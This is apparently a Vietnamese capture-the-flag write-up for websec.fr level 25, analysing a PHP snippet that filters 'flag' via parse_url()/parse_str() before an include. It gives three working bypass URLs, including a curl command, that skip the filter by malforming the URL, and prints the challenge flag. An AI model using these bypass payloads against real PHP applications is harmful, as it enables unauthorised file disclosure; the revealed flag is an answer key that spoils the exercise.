# LevelTwentyFive
>parse_url()
>
Đề bài cho ta source code php sau :
```php
<?php
parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
foreach ($query as $k => $v) {
    if (stripos($v, 'flag') !== false)
        die('You are not allowed to get the flag, sorry :/');
}
include $_GET['page'] . '.txt';
?>
```

## Phân tích source code:
- **parse_url()** : sẽ phân tích url và trả về các thành phần của nó sau đó gán vào mảng `$query`
Ví dụ tham khảo ở : [PHP: parse_url()](https://www.php.net/manual/en/function.parse-url.php) 

![vd](https://github.com/tinasahara1/Study/blob/5e2352c4297a7822b14ecd215f7d4c164c271c74/WebSec/image/vd.PNG)


- Tiếp theo vòng lặp foreach sẽ chạy từng phần tử trong mảng `$query` vừa gán và kiểm xa xem nó có chứa chuỗi `flag` ko => Nếu có thì nó sẽ die() 
- Cách bypass của chúng ta là sẽ không để nó chạy vào vòng lặp foreach bằng cách làm cho url sai => $query = false => thì nó sẽ ko chạy vòng lặp đc 
### payload 1:
`https://websec.fr/level25/index.php?page=flag&foo=127.0:80`

## payload 2: 
`https://websec.fr/level25/index.php?page=flag&a:1`

## payload 3:
parse_str() có thể bị bypass qua curl
`curl https://websec.fr/level25/index.php?page=flag`

Flag: `WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}`
